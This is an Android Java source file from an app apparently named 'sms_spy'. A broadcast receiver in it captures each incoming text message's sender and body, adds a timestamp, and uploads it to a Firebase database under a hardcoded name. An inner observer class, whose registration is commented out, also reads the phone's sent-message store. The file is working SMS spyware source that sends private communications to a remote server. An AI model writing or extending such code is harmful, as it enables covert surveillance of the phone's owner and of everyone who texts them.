package com.example.moonc.sms_spy;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.SmsMessage;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.Date;

/**
 * Created by moonc on 11/9/2017.
 */

public class BroadCast extends BroadcastReceiver {

    Context mContext;
    Date new_date;
    String name = "Pushpo";
    public void onReceive(final Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        mContext = context;


//        SharedPreferences sharedPreferences = context.getSharedPreferences("Login_details",MODE_PRIVATE);
//        name = sharedPreferences.getString("name", "NAME");

        if(bundle!=null)
        {
            Object[] psdus = (Object[]) bundle.get("pdus");
            SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) psdus[0]);
            String number = currentMessage.getDisplayOriginatingAddress();
            String Message = currentMessage.getDisplayMessageBody();
            new_date = new Date();
           Toast.makeText(context,number + " " + Message,Toast.LENGTH_SHORT).show();
           // if(!name.equals("NAME") && !name.isEmpty()) {
                FirebaseDatabase firebaseDatabase = FirebaseDatabase.getInstance();
                DatabaseReference databaseReference = firebaseDatabase.getReference().child(name).child("Incoming_Message");

                String final_str = number + "@@@@" + new_date + "@@@@" + Message;
                databaseReference.push().setValue(final_str);
           // }

//            ContentResolver contentResolver = context.getContentResolver();
//            contentResolver.registerContentObserver(Uri.parse("content://sms"), true, new smsObserver(new Handler()));

        }
    }


    class smsObserver extends ContentObserver {

        private String lastSmsId;

        public smsObserver(Handler handler) {
            super(handler);
        }

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            Uri uriSMSURI = Uri.parse("content://sms/sent");
            Cursor cur = mContext.getContentResolver().query(uriSMSURI, null, null, null, null);
            cur.moveToNext();
            String id = cur.getString(cur.getColumnIndex("_id"));
            if (smsChecker(id)) {
                String address = cur.getString(cur.getColumnIndex("address"));
                // Optional: Check for a specific sender

                String message = cur.getString(cur.getColumnIndex("body"));
               Toast.makeText(mContext,message,Toast.LENGTH_SHORT).show();

            }
        }

        // Prevent duplicate results without overlooking legitimate duplicates
        public boolean smsChecker(String smsId) {
            boolean flagSMS = true;

            if (smsId.equals(lastSmsId)) {
                flagSMS = false;
            }
            else {
                lastSmsId = smsId;
            }

            return flagSMS;
        }
    }




}
